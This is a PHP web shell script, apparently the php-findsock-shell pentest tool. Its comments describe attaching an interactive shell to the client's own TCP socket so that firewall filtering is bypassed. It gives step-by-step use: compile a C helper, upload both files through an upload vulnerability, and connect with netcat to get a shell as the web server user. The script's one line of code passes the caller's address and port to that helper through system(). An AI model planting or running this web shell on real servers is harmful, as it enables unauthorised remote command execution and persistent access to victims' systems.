<?php 
// php-findsock-shell - A Findsock Shell implementation in PHP + C
// Description
// -----------
// (Pair of) Web server scripts that find the TCP socket being used by the 
// client to connect to the web server and attaches a shell to it.  This 
// provides you, the pentester, with a fully interactive shell even if the 
// Firewall is performing proper ingress and egress filtering.
//
// Proper interactive shells are more useful than web-based shell in some
// circumstances, e.g:
//  1: You want to change your user with "su"
//  2: You want to upgrade your shell using a local exploit
//  3: You want to log into another system using telnet / ssh
//
// Limitations
// -----------
// The shell traffic doesn't look much like HTTP, so I guess that you may
// have problems if the site is being protected by a Layer 7 (Application layer) 
// Firewall.
//
// The shell isn't fully implemented in PHP: you also need to upload a
// C program.  You need to either:
//  1: Compile the program for the appropriate OS / architecture then
//     upload it; or
//  2: Upload the source and hope there's a C compiler installed.
//
// This is a pain, but I couldn't figure out how to implement the findsock
// mechanism in PHP.  Email me if you manage it.  I'd love to know.
//
// Only tested on x86 / amd64 Gentoo Linux.
// Here are some brief instructions.
//
// 1: Compile findsock.c for use on the target web server:
//    $ gcc -o findsock findsock.c
//
//    Bear in mind that the web server might be running a different OS / architecture to you.
//
// 2: Upload "php-findsock-shell.php" and "findsock" binary to the web server using
//    whichever upload vulnerability you've indentified.  Both should be uploaded to the 
//    same directory.
//
// 3: Run the shell from a netcat session (NOT a browser - remember this is an
//    interactive shell).
//
//    $ nc -v target 80
//    target [10.0.0.1] 80 (http) open
//    GET /php-findsock-shell.php HTTP/1.0
//
//    sh-3.2$ id
//    uid=80(apache) gid=80(apache) groups=80(apache)
//    sh-3.2$
//    ... you now have an interactive shell ...
//

$VERSION = "1.0";
system( "./findsock " . $_SERVER['REMOTE_ADDR'] . " " . $_SERVER['REMOTE_PORT'] ) 
?>

